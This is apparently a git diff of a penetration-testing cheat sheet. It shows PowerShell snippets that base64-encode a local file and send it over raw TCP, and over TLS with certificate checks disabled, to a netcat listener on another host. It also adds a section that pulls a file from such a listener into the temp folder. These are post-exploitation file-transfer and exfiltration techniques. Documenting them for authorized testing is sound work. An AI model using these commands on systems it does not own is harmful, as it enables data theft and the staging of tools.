@@ -1062,7 +1062,7 @@ Start netcat listener on Linux (10.192.103.49).<br />
 
 Send the file from Windows host using powershell.<br />
 ```powershell
-$fdata=[System.Convert]::ToBase64String([io.file]::ReadAllBytes("c:\path\file.bin"));
+$fdata = [System.Convert]::ToBase64String([io.file]::ReadAllBytes("c:\path\file.bin"));
 $socket = New-Object net.sockets.tcpclient('10.192.103.49', 4444);
 $stream = $socket.GetStream();
 $writer = new-object System.IO.StreamWriter($stream);
@@ -1082,7 +1082,7 @@ Generate a certificate and key first.<br />
 
 Send the file from Windows host using powershell.<br />
 ```powershell
-$fdata=[System.Convert]::ToBase64String([io.file]::ReadAllBytes("c:\path\file.bin"));
+$fdata = [System.Convert]::ToBase64String([io.file]::ReadAllBytes("c:\path\file.bin"));
 $socket = New-Object net.sockets.tcpclient('10.192.103.49', 443);
 $stream = $socket.GetStream();
 $callback = { param($sender, $cert, $chain, $errors) return $true };
@@ -1096,4 +1096,26 @@ $writer.flush();
 $writer.close();
 $stream.close();
 $socket.close();
+```
+
+## >> Downloading a file via powershell
+
+Start netcat listener on Linux (192.168.1.242).<br />
+`cat file.bin | base64 | nc -nlvp 4444`
+
+Retrieve the file from Windows host using powershell.<br />
+```powershell
+$fdata = "";
+$fname = $env:temp + "\file.bin"
+$socket = New-Object net.sockets.tcpclient('192.168.1.242', 4444);
+$stream = $socket.GetStream();
+$reader = new-object System.IO.StreamReader($stream);
+while($stream.DataAvailable)
+{
+   $res = $reader.ReadLine();
+   $fdata = "$fdata$res"
+}
+$bytes = [Convert]::FromBase64String($fdata)
+[IO.File]::WriteAllBytes($fname, $bytes)
+exit;
 ```
